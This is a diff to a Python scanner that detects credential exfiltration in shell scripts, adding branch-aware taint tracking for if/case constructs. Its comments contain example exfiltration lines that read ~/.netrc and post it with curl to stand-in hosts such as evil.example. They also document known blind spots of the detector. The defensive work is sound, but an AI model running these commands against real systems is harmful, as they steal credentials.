@@ -13490,8 +13490,9 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
         applies identically to the loop form). Reported in `direct_or_pipe_lines`.
       HOP — an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
         (`$(cat "$V")` etc.); X then carries that taint at every later offset up to its
-        next non-accumulating rebinding, checked the same way the literal `cred_vars`
-        branch is (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
+        next non-accumulating rebinding, checked the same nearest-prior-binding way
+        `_sh_cred_assign_taint_lines` (B-935) checks the literal `_SH_CRED_ASSIGN_RE`
+        form below (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
         Reported in `hop_lines`.
       PIPE — the body streams a `read_words`-seeded V to stdout (`cat "$V"`, no `>`),
         and the matching `done` is piped into an outbound command; reported on `done`,
@@ -13731,6 +13732,482 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     return direct_hits, hop_hits, header_blanked
 
 
+# B-935: literal (non-loop) counterpart of the HOP role's positional lookup just
+# above. `cred_vars` (in `analyze_shell` below) used to be a flat, FILE-GLOBAL set of
+# variable names built once from every `_SH_CRED_ASSIGN_RE` match in the file, and the
+# sink check then matched any `$NAME` reference on any outbound line ANYWHERE in the
+# file — with no regard to whether THAT SPECIFIC reference still held the
+# credential-read value at that point. Two real shapes this let through:
+#   1. `C=$(cat ~/.netrc); C=$(date); curl -d "$C" https://x.example` — C is REBOUND
+#      to a harmless value before the sink runs, but the flat set still convicted.
+#   2. `curl -d "$X" https://x.example/t; X=$(cat ~/.netrc)` — the credential read
+#      happens AFTER the sink, not before; X is unset/unrelated when curl runs.
+# Fix: resolve each `$NAME` reference to its own nearest-PRIOR binding, using exactly
+# the SAME state-machine/bisect mechanism the HOP role above already uses
+# (`_SH_LOOP_BIND_RE` for every rebind event file-wide, `bisect_right` at reference
+# time) — not a second, independent dataflow engine. Unlike HOP, this is not scoped to
+# any loop region: every `_SH_LOOP_BIND_RE` match in the whole file is a rebind event
+# for its own name, and taint is seeded directly from `_SH_CRED_ASSIGN_RE` (the
+# UNCHANGED literal vocabulary), not from a loop-variable hop.
+# B-935 round 2: the nearest-prior-binding-by-offset lookup above has no notion of
+# MUTUALLY EXCLUSIVE control flow -- an `if`/`elif`/`else` chain or a `case` is sugar
+# for "exactly one of these branches runs," never "run them in the textual order
+# they're written," which is the assumption a flat bisect over a single per-name event
+# list makes. Reviewer repro:
+#
+#   if cond; then
+#     C=$(cat ~/.netrc)
+#   else
+#     C=ok
+#   fi
+#   curl -d "$C" https://evil.example
+#
+# The textually-LAST binding (else's `C=ok`) always "wins" the bisect lookup for the
+# reference after `fi`, regardless of which branch is actually live -- direction-
+# dependent (swap the branches and it fires), same false negative for `case`. B-894's
+# own HOP role has this same weakness pre-existing (unaffected by round 1); round 1
+# imported it into the literal `_SH_CRED_ASSIGN_RE` vocabulary for the first time (the
+# old flat set was branch-blind-proof by being fully position-blind).
+#
+# Fix: `_sh_parse_branch_tree` parses every `if`/`elif`/`else`/`fi` and `case`/`;;`/
+# `esac` construct into a tree (stack-based, same fail-closed discipline
+# `_sh_loop_regions` uses for do/done: any imbalance anywhere returns `[]` for the
+# WHOLE file, never a guessed pairing), and `_sh_cred_replay` walks it ONCE PER NAME,
+# threading a single `entry_taint` down into each branch/arm (so a `+=` inside one
+# branch can never inherit a SIBLING's own rebind) and OR-merging the branches' EXIT
+# taints back into the state at the construct's own close -- "OR across mutually-
+# exclusive branches," never "textually nearest wins." A branch/arm that does not
+# rebind NAME at all contributes whatever taint was true BEFORE the whole construct
+# (falls through to the outer state, never a sibling's value). An `if` with no `else`,
+# or a `case` with no bare `*)` catch-all arm, ALSO OR-in the pre-construct taint
+# directly (the construct might not run any branch at all) -- but only then: an
+# if/case that DOES exhaustively cover every path must not have an unrelated,
+# already-cleared pre-construct taint re-injected by this fallback, or a credential
+# correctly cleared by EVERY branch would wrongly stay convicted. A file with no
+# if/case at all (the overwhelming majority) degenerates to exactly round 1's flat
+# replay -- `_sh_cred_replay` called with an empty construct list IS the round-1 state
+# machine, byte-for-byte.
+_SH_BRANCH_KW_RE = re.compile(
+    r"(?:" + _SH_LOOP_CMD_POS + r"(?P<kw>if|then|elif|else|fi|case|esac)\b)"
+    r"|(?P<dsemi>;;)"
+)
+# A case arm's own pattern is a bare, unconditional catch-all: `*)`  or `(*)`, with
+# optional surrounding whitespace/newlines -- checked at the arm's own START offset
+# (`Pattern.match(string, pos)` anchors there directly; no `\A`/`^` token needed, and
+# neither would work correctly here since `\A` anchors to offset 0 of the STRING, not
+# to `pos`).
+_SH_CASE_WILDCARD_ARM_RE = re.compile(r"[ \t\n]*\(?[ \t\n]*\*[ \t\n]*\)")
+# The literal `in` closing a case's own `case WORD in` header. Searched for ONLY
+# right after a recognized `case` keyword (never scanned for globally -- a bare
+# `\bin\b` search over the whole file would collide with a `for NAME in` loop
+# header), so this cannot mistake an unrelated loop's own `in` for a top-level
+# `case`'s.
+_SH_CASE_IN_RE = re.compile(r"\bin\b")
+# B-935 round 4: `\bin\b` alone still matches a BARE `$in`/`${in}` variable
+# reference, or an `in` sitting inside an OPEN `${...}` parameter expansion
+# (`${x:-in}`, `${in:-x}`, `${#in}`, ...) -- `$`/`{` are non-word characters, so
+# `\bin\b` validly matches the "in" inside any of those, mistaking it for the
+# real terminator and truncating the subject scan early. `_sh_case_find_in` below
+# rejects a candidate that is (a) immediately preceded by a bare `$` (catches
+# `$in`; a REAL terminator is always separated from the subject WORD by
+# whitespace, so this never rejects a genuine one), or (b) positioned inside an
+# unclosed `${` opened since `start` (catches every `${...in...}` shape,
+# regardless of where "in" sits inside the braces) -- and keeps scanning FORWARD
+# for the next candidate rather than failing closed on the first false match,
+# since a real terminator may still exist later in the subject.
+_SH_CASE_BRACE_RE = re.compile(r"\$\{|\}")
+# `_sh_cred_replay` recursion-depth guard (see its own docstring): caps how many
+# NESTED (not sequential) if/case levels get real branch-aware replay before
+# falling back to a flat, branch-blind drain for everything past this point.
+_SH_CRED_REPLAY_MAX_DEPTH = 250
+
+
+def _sh_case_find_in(kw: str, start: int):
+    """The first `in` at or after `start` that is a real top-level `case ... in`
+    terminator -- not a bare `$in`/`${in}` reference, and not sitting inside some
+    OTHER, unrelated `${...}` parameter expansion opened since `start` (see the
+    design note above `_SH_CASE_BRACE_RE`). `${`/`}` and `in` candidates are each
+    found via one compiled `finditer` pass (never a per-character Python loop) and
+    merged by position, so a brace's own depth contribution is only counted once
+    each `in` candidate actually needs it. Returns the match object, or `None` if
+    no valid candidate exists (fails closed the same way `.search()` returning
+    `None` already did -- see `_sh_parse_branch_tree`'s own docstring for what that
+    means for the whole file).
+
+    KNOWN, accepted imprecision (not chased further, same lexical-layer spirit as
+    B-957's do/done-vs-case-label note above): a `for ... in ... done` NESTED
+    INSIDE a case's own SUBJECT expression (`case $(for f in *; do ...; done)
+    in ...`) has its own earlier, bare (non-`$`/`${`-prefixed) `in`, which this
+    search would still accept as the terminator, truncating the subject span too
+    early. Vanishingly rare in real shell (a subject is essentially always a bare
+    `$var`/`$(cmd)`/literal, never a nested loop); does not itself convict
+    anything wrongly, only mis-attributes which span some later text falls in,
+    the same class of imprecision the file already accepts elsewhere at this
+    lexical/regex layer.
+    """
+    braces = _SH_CASE_BRACE_RE.finditer(kw, start)
+    next_brace = next(braces, None)
+    depth = 0
+    for m in _SH_CASE_IN_RE.finditer(kw, start):
+        while next_brace is not None and next_brace.start() < m.start():
+            if next_brace.group() == "${":
+                depth += 1
+            elif depth > 0:
+                depth -= 1
+            next_brace = next(braces, None)
+        if depth == 0 and (m.start() == 0 or kw[m.start() - 1] != "$"):
+            return m
+    return None
+
+
+def _sh_parse_branch_tree(kw: str) -> list:
+    """Stack-based parse of `kw` into a tree of if/case construct dicts (see the
+    design note above). FAILS CLOSED (`[]`) on any structural imbalance -- an `if`
+    with no matching `fi`, a `then`/`elif`/`else`/`fi` with no open `if`, an `esac`
+    with no open `case`, a `case` with no `in`, or a nested construct opened while an
+    `if`'s own CONDITION (before its first `then`) is still being scanned (too
+    rare/pathological a shape to track correctly at this lexical layer). This is NOT
+    a no-op fallback: when `_sh_parse_branch_tree` returns `[]`, `_sh_cred_replay` (in
+    `_sh_cred_assign_taint_lines`) gets an empty construct list and degenerates to a
+    flat, branch-blind drain across the WHOLE FILE for every name -- i.e. round 1's
+    behavior, including round 1's own branch-blindness this round exists to fix, for
+    the ENTIRE file, not just the unparseable construct. That is a real regression
+    back to round-1 behavior for that one file (though never a crash and never a
+    false CONVICTION beyond what round 1 already produced) -- tracked as a known,
+    accepted limitation of this lexical/regex layer, the same class as B-957's
+    do/done blast-radius note above, not something this round fixes.
+    """
+    top: list = []
+    stack: list = []
+
+    def children_target(pos: int):
+        if not stack:
+            return top
+        f = stack[-1]
+        if f["kind"] == "if":
+            return f["branches"][-1]["children"] if f["branches"] else None
+        if pos < f["in_pos"]:
+            return f["subject"]["children"]
+        return f["arms"][-1]["children"] if f["arms"] else None
+
+    for m in _SH_BRANCH_KW_RE.finditer(kw):
+        if m.group("dsemi"):
+            if stack and stack[-1]["kind"] == "case" and stack[-1]["arms"]:
+                arm = stack[-1]["arms"][-1]
+                if arm["end"] is None:
+                    arm["end"] = m.start()
+                    stack[-1]["arms"].append({"start": m.end(), "end": None, "children": []})
+            continue
+        kw_name = m.group("kw")
+        start, end = m.start("kw"), m.end("kw")
+        if kw_name == "if":
+            dest = children_target(start)
+            if dest is None:
+                return []
+            frame = {"kind": "if", "start": start, "branches": [], "has_else": False,
+                     "awaiting_then": True, "_dest": dest}
+            # The branch's own span starts right here, at `if`'s end -- covering its
+            # CONDITION text too, not just the `then` body. A condition can itself be
+            # an outbound command referencing NAME (`if curl -d "$C" URL; then ...`)
+            # or even an assignment (`if C=$(cat cred); then ...`, unusual but legal);
+            # starting the branch at `then`'s end instead would silently drop every
+            # such reference/binding from BOTH the replay and the query resolution
+            # below, since it belongs to no branch and to no straight-line segment of
+            # the enclosing scope either.
+            frame["branches"].append({"start": end, "end": None, "children": []})
+            stack.append(frame)
+        elif kw_name == "case":
+            dest = children_target(start)
+            if dest is None:
+                return []
+            in_m = _sh_case_find_in(kw, end)
+            if in_m is None:
+                return []
+            # The SUBJECT (`case WORD` up to `in`) is UNCONDITIONAL, single-execution
+            # state shared by every arm -- not private to arm[0]. A side-effecting
+            # command substitution in the subject (`case "$(C=safe; echo mode)" in`)
+            # must be visible to EVERY arm's own entry taint, not just the first one
+            # textually adjacent to it; `_sh_cred_replay` gives it its own replay,
+            # once, and threads its EXIT taint into every arm (see its own docstring).
+            frame = {"kind": "case", "start": start, "in_pos": in_m.start(),
+                     "subject": {"start": end, "end": in_m.start(), "children": []},
+                     "arms": [], "_dest": dest}
+            frame["arms"].append({"start": in_m.end(), "end": None, "children": []})
+            stack.append(frame)
+        elif kw_name == "then":
+            if not stack or stack[-1]["kind"] != "if" or not stack[-1]["awaiting_then"]:
+                return []
+            stack[-1]["awaiting_then"] = False
+        elif kw_name == "elif":
+            if not stack or stack[-1]["kind"] != "if" or stack[-1]["awaiting_then"]:
+                return []
+            f = stack[-1]
+            f["branches"][-1]["end"] = start
+            # Same reasoning as `if` above: the new branch starts at `elif`'s own
+            # end, covering ITS condition too, not just its `then` body.
+            f["branches"].append({"start": end, "end": None, "children": []})
+            f["awaiting_then"] = True
+        elif kw_name == "else":
+            if not stack or stack[-1]["kind"] != "if" or stack[-1]["awaiting_then"]:
+                return []
+            f = stack[-1]
+            f["branches"][-1]["end"] = start
+            f["branches"].append({"start": end, "end": None, "children": []})
+            f["has_else"] = True
+        elif kw_name == "fi":
+            if not stack or stack[-1]["kind"] != "if" or stack[-1]["awaiting_then"]:
+                return []
+            f = stack.pop()
+            f["branches"][-1]["end"] = start
+            f["_dest"].append(
+                {"type": "if", "start": f["start"], "end": end,
+                 "branches": f["branches"], "has_else": f["has_else"]}
+            )
+        elif kw_name == "esac":
+            if not stack or stack[-1]["kind"] != "case":
+                return []
+            f = stack.pop()
+            if f["arms"][-1]["end"] is None:
+                f["arms"][-1]["end"] = start
+            # A `;;` right before `esac` (common, legal style: every real arm,
+            # including the last one, terminated the same way) opens a fresh,
+            # spurious trailing "arm" that is really just the whitespace gap before
+            # `esac` -- drop it, or its empty replay would silently contribute the
+            # PRE-CONSTRUCT taint to the merge even when a real `*)` catch-all arm
+            # elsewhere already proved every genuine path clears NAME.
+            if len(f["arms"]) > 1 and not kw[f["arms"][-1]["start"] : f["arms"][-1]["end"]].strip():
+                f["arms"].pop()
+            has_wild = any(_SH_CASE_WILDCARD_ARM_RE.match(kw, a["start"]) for a in f["arms"])
+            f["_dest"].append(
+                {"type": "case", "start": f["start"], "end": end,
+                 "subject": f["subject"], "arms": f["arms"], "has_fallback": has_wild}
+            )
+    if stack:
+        return []
+    return top
+
+
+def _sh_cred_replay(
+    offsets: list, events: list, queries: list, span_start: int, span_end: int,
+    entry_taint: bool, children: list, results: list, depth: int = 0,
+) -> bool:
+    """Replay one name's straight-line `events` (parallel sorted `offsets`, and
+    `(offset, op, is_cred)` triples) across `[span_start, span_end)`, recursing into
+    every direct-child if/case `children` node with `entry_taint` snapshotted at the
+    fork and OR-merging the branches'/arms' own exit taints back in at the
+    construct's close (see the design note above `_sh_parse_branch_tree`).
+
+    A `case` node's `subject` is replayed EXACTLY ONCE, before any arm, using the
+    SAME `cur` every arm would otherwise fork from -- its EXIT taint (not `cur`
+    itself) becomes the `entry_taint` for every arm, and the fallback contribution
+    when there's no `*)` catch-all. The subject is unconditional, single-execution,
+    shared state (`case "$(C=safe; echo mode)" in a) ... ;; *) ... ;; esac` clears C
+    for EVERY arm, not just the one textually adjacent to it); treating it as any one
+    arm's own private scope -- as an earlier build of this fix did -- either hides a
+    genuine clear from every arm but the first, or hides a genuine credential read
+    from every arm but the first, depending on which way the bug points. An `if`'s
+    own condition does NOT get this treatment (deliberately -- see
+    `_sh_parse_branch_tree`'s own comments): each `if`/`elif` condition only really
+    runs if control reaches it, so it stays private to its own branch, unlike a
+    case subject which unconditionally runs before every arm.
+
+    `queries` is the SAME name's own sorted `$NAME`-reference offsets (every
+    outbound-line reference, regardless of branch). Each query offset reached during
+    the walk is resolved using `cur` AT THAT EXACT POINT -- never a flat, whole-name
+    bisect -- and appended to `results` as `(query_offset, taint)`. This is what keeps
+    a reference INSIDE one branch from ever seeing a MUTUALLY EXCLUSIVE sibling
+    branch's own binding: a query inside branch B is only ever reached by the
+    recursive call scoped to `[B.start, B.end)`, using that call's own locally
+    threaded `cur`, which a sibling branch's events never touch. A plain flat
+    per-name event trace (offset, taint-after) list, bisected once per reference
+    afterward, CANNOT make this distinction -- the bisect has no notion that offset
+    X (a sibling branch's own binding) and offset Y (this branch's reference) are
+    mutually exclusive; interleaving query resolution into the same branch-scoped
+    walk that already gets binding state right is what closes that gap too.
+
+    Events and queries within one straight-line stretch are processed in strict
+    offset order (whichever is next), so a query sees every event genuinely before
+    it and none after.
+
+    `depth` counts NESTED (not sequential) if/case levels only -- siblings in the
+    same `children` list are iterated, not recursed into, so a long straight-line
+    run of non-nested constructs costs no extra stack depth at all. Real, adversarial
+    NESTING depth, unlike sequential count, drove an uncaught `RecursionError` at
+    ~1,000 levels during review; past `_SH_CRED_REPLAY_MAX_DEPTH`, a node's WHOLE
+    span (subject/condition + every branch/arm, arbitrarily deeper nesting included)
+    is drained as one flat, branch-blind straight-line run instead of being
+    recursed into at all -- safe (this function can never crash the caller on
+    adversarial nesting) and conservative (silently reverts to round-1 behavior for
+    just that one over-deep subtree, never a false CONVICTION beyond what round 1
+    already produced there).
+
+    Returns the taint at `span_end`, the caller's own next `entry_taint`."""
+    cur = entry_taint
+    ei = bisect.bisect_left(offsets, span_start)
+    qi = bisect.bisect_left(queries, span_start)
+
+    def drain(stop: int) -> None:
+        nonlocal cur, ei, qi
+        while True:
+            e_off = offsets[ei] if ei < len(offsets) and offsets[ei] < stop else None
+            q_off = queries[qi] if qi < len(queries) and queries[qi] < stop else None
+            if e_off is None and q_off is None:
+                return
+            if q_off is not None and (e_off is None or q_off <= e_off):
+                results.append((q_off, cur))
+                qi += 1
+            else:
+                off, op, is_cred = events[ei]
+                cur = (cur or is_cred) if op == "+=" else (False if op == "clear" else is_cred)
+                ei += 1
+
+    for node in children:
+        drain(node["start"])
+        if depth >= _SH_CRED_REPLAY_MAX_DEPTH:
+            drain(node["end"])
+        elif node["type"] == "if":
+            exits = [
+                _sh_cred_replay(
+                    offsets, events, queries, b["start"], b["end"], cur, b["children"],
+                    results, depth + 1,
+                )
+                for b in node["branches"]
+            ]
+            if not node["has_else"]:
+                exits.append(cur)
+            cur = any(exits)
+        else:
+            subj = node["subject"]
+            subj_exit = _sh_cred_replay(
+                offsets, events, queries, subj["start"], subj["end"], cur, subj["children"],
+                results, depth + 1,
+            )
+            exits = [
+                _sh_cred_replay(
+                    offsets, events, queries, a["start"], a["end"], subj_exit, a["children"],
+                    results, depth + 1,
+                )
+                for a in node["arms"]
+            ]
+            if not node["has_fallback"]:
+                exits.append(subj_exit)
+            cur = any(exits)
+        ei = bisect.bisect_left(offsets, node["end"])
+        qi = bisect.bisect_left(queries, node["end"])
+    drain(span_end)
+    return cur
+
+
+def _sh_cred_assign_taint_lines(masked: str) -> set:
+    """1-indexed outbound lines where a `$NAME` reference positionally resolves —
+    by nearest PRIOR reachable binding, never by file-global set membership — to a
+    still-live `_SH_CRED_ASSIGN_RE` credential-read value. `+=` accumulation keeps
+    whatever taint state the name already carried (mirrors the HOP role's own `keep`
+    semantics: an append can only add to what is already there, never launder it
+    away); any other rebind (`NAME=...`, `read NAME`, `unset NAME`,
+    `mapfile`/`readarray NAME`, `printf -v NAME`, a nested `for NAME in`, a bare
+    `local`/`declare NAME`) clears it. Round 2 (see the design note above
+    `_sh_parse_branch_tree`) makes "nearest prior" branch-aware: a binding inside one
+    arm of an `if`/`elif`/`else` or `case` is never visible to a MUTUALLY EXCLUSIVE
+    sibling arm, and the state right after the construct closes is the OR-merge of
+    every reachable branch's own exit state, not whichever branch happens to be
+    written last in the file.
+
+    Safety net: a `_SH_CRED_ASSIGN_RE` match that `_SH_LOOP_BIND_RE` itself does not
+    also recognize as a bind (e.g. an assignment sitting somewhere `_SH_LOOP_CMD_POS`'s
+    command-position lookbehind does not cover) is still seeded as its own tainting
+    event at its own offset — this positional replacement must convict everything the
+    old flat set did, only scoped correctly to the right reference, never LESS.
+
+    Every `if`/`elif` branch's own span starts at the KEYWORD's own end, not its
+    `then`'s -- it covers that branch's CONDITION text too (`if curl -d "$C" URL;
+    then ...` is a real, if unusual, way to write an outbound reference; `if
+    C=$(cat cred); then ...` a real way to write a binding), so neither a reference
+    nor a binding sitting in a condition is silently invisible to both the branch
+    replay and the query resolution below. DELIBERATELY out of scope: each branch,
+    condition included, still replays from the SAME pre-construct `entry_taint` --
+    real bash actually threads one condition's own side effects into the NEXT
+    condition tested (`if C=$(cat cred); then :; elif true; then curl -d "$C" ...;
+    fi` -- COND1 assigning C really is visible to elif's own COND2/BODY2 if COND1 was
+    false). Modeling that would need cumulative sequential-with-fork semantics, not
+    just OR-merged branches; this scanner does not have it. This can only make the
+    fix UNDER-convict this one rare compound shape (assignment-as-a-condition-test,
+    referenced only from a LATER sibling), never over-convict, and never regress a
+    case round 1 already caught.
+
+    KNOWN LIMITATION, same one already accepted for the HOP role's own loop-scoped
+    version (see the design note above `_sh_loop_cred_exfil_lines`, "a helper function
+    defined above the loop and called after it"): resolution is POSITIONAL, not
+    call-graph aware. A function whose body references NAME, textually written BEFORE
+    the credential-read assignment that (at runtime) only lands in NAME once the
+    function is later CALLED, is invisible here — the reference's own offset precedes
+    the binding's, so the nearest-prior-binding lookup finds nothing. This is a plain
+    forward reference through a delayed call, the same shape B-894 already carries as
+    a documented FN rather than inventing a call-graph model this scanner does not
+    have; `tests/test_b935_shell_cred_var_position_taint.py` pins it as an accepted,
+    B-894-consistent residual, not a silently-ignored gap.
+    """
+    text = _sh_loop_blank_heredocs(_sh_loop_join_continuations(masked))
+    kw = _sh_loop_code_mask(text)
+    cred_starts: dict = {}
+    for m in _SH_CRED_ASSIGN_RE.finditer(masked):
+        cred_starts.setdefault(m.group("var"), set()).add(m.start())
+    events: dict = {}
+    for b in _SH_LOOP_BIND_RE.finditer(kw):
+        if b.group("var") and b.group("op"):
+            name, op = b.group("var"), b.group("op")
+            off = b.start("var")
+            events.setdefault(name, []).append((off, op, off in cred_starts.get(name, ())))
+        else:
+            for nm in _sh_loop_bound_names(b):
+                events.setdefault(nm, []).append((b.end(), "clear", False))
+    for name, starts in cred_starts.items():
+        seen = {off for off, _op, _c in events.get(name, [])}
+        for off in starts - seen:
+            events.setdefault(name, []).append((off, "=", True))
+    if not events:
+        return set()
+    # Every `$NAME` reference on an OUTBOUND line, for every name that has at least
+    # one binding somewhere in the file -- resolved per-name, branch-scoped, below
+    # (never a flat whole-name bisect; see `_sh_cred_replay`'s own docstring for why
+    # that would reopen the branch-blindness bug this round exists to fix).
+    #
+    # B-912/B-935 merge note: spans are built from `text` (the already-joined/
+    # heredoc-blanked form computed above), not bare `masked` -- an outbound word
+    # (curl/wget/nc) on a backslash-continued command's FIRST physical line must
+    # still cover its continuation lines, where the `$NAME` reference typically sits
+    # (`curl -sS -X POST \` / `  --data "$K" \` / `  https://…`). Building spans from
+    # `masked` instead would only capture the first physical line's own narrow span,
+    # missing every reference on a continuation line -- exactly the same offset
+    # alignment `text` already gives every other consumer in this file (same-length
+    # join, so an offset found in `text` is the SAME offset in `masked`).
+    outbound_line_spans: list = []
+    pos = 0
+    for raw in text.split("\n"):
+        if _SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw):
+            outbound_line_spans.append((pos, pos + len(raw)))
+        pos += len(raw) + 1
+    tree = _sh_parse_branch_tree(kw)
+    hits: set = set()
+    if not outbound_line_spans:
+        return hits
+    for name, evs in events.items():
+        evs.sort(key=lambda e: e[0])
+        offs = [e[0] for e in evs]
+        queries: list = []
+        ref = _sh_loop_ref_re(name)
+        for a, b in outbound_line_spans:
+            queries.extend(rm.start() for rm in ref.finditer(text, a, b))
+        if not queries:
+            continue
+        results: list = []
+        _sh_cred_replay(offs, evs, queries, 0, len(text), False, tree, results)
+        for off, taint in results:
+            if taint:
+                hits.add(masked.count("\n", 0, off) + 1)
+    return hits
+
+
 def _sh_mask_comments(source: str) -> str:
     """Blank whole-line shell comments while preserving line numbers, so a documented
     'curl ... | sh' example in a comment can't fire."""
@@ -13820,12 +14297,18 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "(nc//dev/tcp) — credential exfiltration",
             )
 
-    cred_vars = {m.group("var") for m in _SH_CRED_ASSIGN_RE.finditer(masked)}
+    # B-935: `cred_var_lines` is the POSITIONAL replacement for the old flat,
+    # file-global `cred_vars` NAME set — see `_sh_cred_assign_taint_lines`'s own
+    # docstring above for why a name-membership check over-and-under-convicted (a
+    # rebound name stayed tainted forever; a name read only AFTER the sink line was
+    # tainted retroactively). It reports LINES, not names, because "is this reference
+    # live" is a per-reference question, not a per-name one.
+    cred_var_lines = _sh_cred_assign_taint_lines(masked)
     # B-894: loop-unrolled counterparts of the two checks below — see the design note
     # above `_sh_mask_comments`. `loop_direct_lines` is the DIRECT/PIPE roles (the
     # `_SH_CRED_FILE_RE` sink-line vocabulary, same message/exemption as the block right
-    # below); `loop_hop_lines` is the HOP role (joins `cred_vars`, same message, no
-    # exemption — matches how `cred_vars` itself gets none). `header_blanked` (B-936) is
+    # below); `loop_hop_lines` is the HOP role (joins `cred_var_lines`, same message, no
+    # exemption — matches how `cred_var_lines` itself gets none). `header_blanked` (B-936) is
     # `masked` with every seeded loop's OWN `for V in <words>` word-list text blanked —
     # same length, same line count, a documented drop-in substitute for `masked` in any
     # literal single-line scan (see `_sh_loop_cred_exfil_lines`'s own docstring) — so a
@@ -13846,8 +14329,9 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     #
     # puts the outbound word (`curl`) and the credential reference (`"$S"`) on
     # DIFFERENT physical lines, so neither the literal-path branch (`_SH_CRED_FILE_RE`)
-    # nor the `cred_vars` variable-reference branch below could ever see both halves at
-    # once — a real miss (FN), not an evasion, since this is ordinary shell formatting.
+    # nor the `cred_var_lines` variable-reference branch below could ever see both
+    # halves at once — a real miss (FN), not an evasion, since this is ordinary shell
+    # formatting.
     # `_sh_loop_join_continuations` is applied to `header_blanked` (not bare `masked`)
     # so BOTH fixes compose: the text is header-blanked AND continuation-joined before
     # this scan ever runs. Since `header_blanked` is line-structure-identical to
@@ -13902,11 +14386,12 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             # DIFFERENT credential variable also sent on the same line. Fall
             # through to the variable check below instead of `continue`-ing
             # past it, so an exempt TLS path can never launder an unrelated
-            # `cred_vars` hit in the same command.
-        # `loop_direct_lines`/`loop_hop_lines` hold PHYSICAL line numbers (the B-894
-        # engine's own per-physical-line reporting, unchanged by this fix — see the
-        # B-912 note above). A hit anywhere in the physical span this logical line
-        # covers belongs to this same command, so it is reported once, at `i`.
+            # `cred_var_lines` hit in the same command.
+        # `loop_direct_lines`/`loop_hop_lines`/`cred_var_lines` all hold PHYSICAL line
+        # numbers (the B-894/B-935 engines' own per-physical-line reporting, unchanged
+        # by this fix — see the B-912 note above). A hit anywhere in the physical span
+        # this logical line covers belongs to this same command, so it is reported
+        # once, at `i`.
         if any(k in loop_direct_lines for k in range(i, line_end + 1)):
             add(
                 "SHELL_CRED_EXFIL",
@@ -13915,7 +14400,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "reads a credential file and sends it to an outbound command "
                 "(curl/wget/nc) — credential exfiltration",
             )
-        if any(re.search(r"\$\{?" + re.escape(v) + r"\b", raw) for v in cred_vars) or any(
+        if any(k in cred_var_lines for k in range(i, line_end + 1)) or any(
             k in loop_hop_lines for k in range(i, line_end + 1)
         ):
             add(
